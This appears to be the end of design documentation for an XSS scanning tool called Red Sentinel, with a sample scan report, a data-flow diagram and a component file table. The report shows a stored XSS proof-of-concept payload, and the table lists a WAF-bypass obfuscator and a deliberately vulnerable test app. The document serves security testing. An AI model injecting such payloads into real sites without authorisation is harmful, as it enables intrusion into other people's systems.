```json
{
  "scanId": "scan-002",
  "url": "http://localhost:9090/stored/comments",
  "status": "DONE",
  "summary": {
    "totalPayloads": 3,
    "confirmedVulns": 1,
    "severityBreakdown": {"HIGH": 1}
  },
  "vulns": [
    {
      "param": "body",
      "payload": "<img src=x onerror=alert(1)>",
      "type": "stored_xss",
      "severity": "HIGH",
      "executed": true,
      "stored": true,
      "evidence": {
        "submitMethod": "POST",
        "pollUrl": "http://localhost:9090/stored/comments",
        "browserAlertTriggered": true
      }
    }
  ]
}
```

---

## Appendix A: Data Flow Diagram (ASCII)

```
USER INPUT                     INTERNAL                        OUTPUT
──────────                     ────────                        ──────
                               
URL + Options                  Crawl → Endpoints               HTML Report
  │                               │                              │
  ▼                               ▼                              ▼
┌───────────┐               ┌──────────────┐              ┌──────────┐
│ Dashboard  │               │ Core Scan    │              │ Report    │
│ Next.js    │────POST────►  │ NestJS API   │──Queue──►   │ Generator │
│ :3000      │               │ :4000        │              │           │
└───────────┘               └──────┬───────┘              └──────────┘
                                   │
                          ┌────────┴────────┐
                          │                 │
                    Context Module    Payload Gen Module
                    :5001              :5002
                          │                 │
                    Probe Inject    Payload Bank
                    char_fuzzer      + XGBoost
                    ai_classifier    + Selector
                    html_parser      + Obfuscator
                          │                 │
                          └────────┬────────┘
                                   │
                            Fuzzer Module
                            :5003
                                   │
                          ┌────────┴────────┐
                          │                 │
                   HTTP Sender        Browser Verifier
                   reflection_         (headless Chrome)
                   checker              
                   dom_scanner           
                          │                 │
                          └────────┬────────┘
                                   │
                              Target App
                          (e.g. :9090)
```

## Appendix B: Key File References

| Component | File | Purpose |
|-----------|------|---------|
| Dashboard UI | `dashboard/components/new-scan-form.tsx` | User input form |
| Dashboard API | `dashboard/lib/api.ts` | HTTP client to core API |
| WebSocket | `dashboard/hooks/use-scan-socket.ts` | Real-time scan updates |
| Core Controller | `core/src/scan/scan.controller.ts` | REST API entry point |
| Core Service | `core/src/scan/scan.service.ts` | Business logic |
| Core DTO | `core/src/scan/dto/create-scan.dto.ts` | Input validation schema |
| Queue Producer | `core/src/queue/scan.producer.ts` | BullMQ job enqueue |
| Queue Processor | `core/src/queue/scan.processor.ts` | BullMQ job processing (phase orchestration) |
| Crawler | `core/src/crawler/crawler.service.ts` | Endpoint discovery |
| Fuzzer Client | `core/src/modules-bridge/fuzzer-client.service.ts` | HTTP calls to Python modules |
| Severity Scorer | `core/src/common/utils/severity-scorer.ts` | Vulnerability severity computation |
| Risk Calculus | `core/src/common/utils/risk-calculus.ts` | Aggregate risk scoring |
| Report Service | `core/src/report/report.service.ts` | Report generation |
| Example Report | `core/example_reports/62587fda-d7d2-4545-ad2b-321ab30c28a4.json` | Concrete report output |
| Probe Injector | `modules/context-module/probe_injector.py` | Unique marker injection |
| Char Fuzzer | `modules/context-module/char_fuzzer.py` | Context type detection |
| AI Classifier | `modules/context-module/ai_classifier.py` | ML-based context classification |
| HTML Parser | `modules/context-module/html_parser.py` | DOM tree reflection analysis |
| Payload Bank | `modules/payload-gen-module/bank.py` | Payload database by context |
| XGBoost Ranker | `modules/payload-gen-module/xgboost_ranker.py` | Payload scoring model |
| Selector | `modules/payload-gen-module/selector.py` | Context-aware payload filtering |
| Obfuscator | `modules/payload-gen-module/obfuscator.py` | WAF bypass transformations |
| HTTP Sender | `modules/fuzzer-module/http_sender.py` | Payload HTTP delivery |
| Reflection Checker | `modules/fuzzer-module/reflection_checker.py` | Payload reflection detection |
| DOM Scanner | `modules/fuzzer-module/dom_xss_scanner.py` | JavaScript sink analysis |
| Browser Verifier | `modules/fuzzer-module/browser_verifier.py` | Headless Chrome execution confirmation |
| Training Collector | `modules/fuzzer-module/training_collector.py` | Runtime data collection → retraining feedback loop (see §15) |
| Eval Runner | `eval/run.py` | Reproducible evaluation harness |
| Labeled Data | `dataset/processed/payloads_labeled.csv` | 19,015 labeled training payloads |
| Ranker Training | `dataset/ranker_training/ranker_training_samples.jsonl` | 9,012 scored samples |
| XSS Classifier | `model/xss_classifier.py` | LSTM+Attention classification model |
| Dataset Loader | `model/dataset_loader.py` | Training data loading |
| Tokenizer | `model/train_tokenizer.py` | BPE tokenizer training |
| Database Schema | `init.sql` | `CREATE DATABASE rs;` |
| Docker Compose | `docker-compose.yml` | Service orchestration |
| Exploitable App | `exploitable/app.py` | Deliberately vulnerable test target (47 endpoints) |
```

---

> **Generated**: 2026-05-21 | **Project**: Red Sentinel (Xbow) | **Purpose**: Complete data flow documentation with concrete evidence at every step.
